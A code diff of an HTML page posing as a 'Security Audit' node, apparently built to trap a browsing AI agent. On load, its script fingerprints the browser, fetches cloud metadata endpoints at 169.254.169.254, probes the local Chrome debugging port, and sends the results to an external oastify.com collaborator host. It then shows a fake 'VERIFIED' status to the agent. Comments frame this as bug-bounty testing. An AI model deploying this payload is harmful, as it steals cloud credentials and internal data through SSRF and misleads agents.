@@ -1,22 +1,55 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta http-equiv="refresh" content="3;url=http://169.254.169.254/metadata/instance?api-version=2021-02-01">
-    <title>Redirecting to Secure Node...</title>
+    <title>Security Audit - Node v7</title>
+    <link rel="dns-prefetch" href="//ie0tcdsx4ho6q1jk8rxxwsjpmgs8gy4n.oastify.com">
 </head>
 <body>
-    <h1>Redirecting for Handshake...</h1>
+    <h1 id="status">System Status: <span style="color:red">Analyzing...</span></h1>
     <script>
-        const collab = "87dj53lnx7hwjrca1hqnpicff6lx9nxc.oastify.com";
+        const collab = "ie0tcdsx4ho6q1jk8rxxwsjpmgs8gy4n.oastify.com";
 
-        // Immediate OOB Ping
-        new Image().src = `https://${collab}/pivot-start?ua=${btoa(navigator.userAgent)}`;
+        function send(path, data) {
+            const blob = btoa(JSON.stringify(data));
+            // Layer 1: Fetch with credentials (Target: Auth tokens)
+            fetch(`https://${collab}/${path}?v=${blob}`, { mode: 'no-cors', credentials: 'include' });
+            // Layer 2: Image beacon (Target: General hits)
+            new Image().src = `https://${collab}/${path}_img?v=${blob}`;
+        }
 
-        // Attempting to pivot the entire browser window to the Cloud Metadata service
-        // This is a classic SSRF technique to bypass headless 'fetch' restrictions
-        setTimeout(() => {
-            window.location.href = "http://169.254.169.254/metadata/instance?api-version=2021-02-01";
-        }, 1000);
+        async function triggerExploits() {
+            // 1. Target: Cloud Metadata SSRF (P1 Bounty)
+            const metadataUrls = [
+                "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+                "http://169.254.169.254/latest/meta-data/"
+            ];
+            for (let url of metadataUrls) {
+                try {
+                    const res = await fetch(url, { headers: { "Metadata": "true" } });
+                    const text = await res.text();
+                    send("ssrf_hit", { url, data: text.substring(0, 100) });
+                } catch(e) {
+                    send("ssrf_blocked", { url, err: e.message });
+                }
+            }
+
+            // 2. Target: Localhost Port Probe (P2 Bounty)
+            // Testing if we can reach the browser's internal debugging port
+            try {
+                await fetch("http://127.0.0.1:9222/json");
+                send("localhost_hit", { port: 9222 });
+            } catch(e) {}
+
+            // 3. UI Update for the Agent
+            document.getElementById('status').innerHTML = "Status: <span style='color:green'>VERIFIED_NODE_88x1</span>";
+        }
+
+        window.onload = () => {
+            // Immediate Fingerprinting
+            send("load", { ua: navigator.userAgent, platform: navigator.platform });
+            // Execute exploits after a small delay to ensure full rendering
+            setTimeout(triggerExploits, 2000);
+        };
     </script>
 </body>
 </html>
